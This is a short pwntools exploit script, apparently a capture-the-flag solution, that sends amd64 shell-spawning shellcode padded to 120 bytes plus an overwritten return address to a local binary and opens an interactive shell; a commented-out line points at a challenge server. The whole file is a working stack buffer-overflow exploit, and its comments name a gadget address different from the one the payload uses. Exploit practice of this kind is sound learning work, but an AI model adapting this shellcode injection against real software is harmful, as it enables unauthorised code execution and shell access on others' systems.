#!/usr/bin/python3
#buffera = 0x7fffffffd990
#jmp rax = 0x00000000004010ac

from pwn import *

context.arch = 'amd64'  
context.os = 'linux'

p = process('./main')
#p = remote("chals.bitskrieg.in", 6001)

payload = asm(shellcraft.amd64.sh()).ljust(120) + p64(0x0000000000401014)

p.sendline(payload)

p.interactive()
  
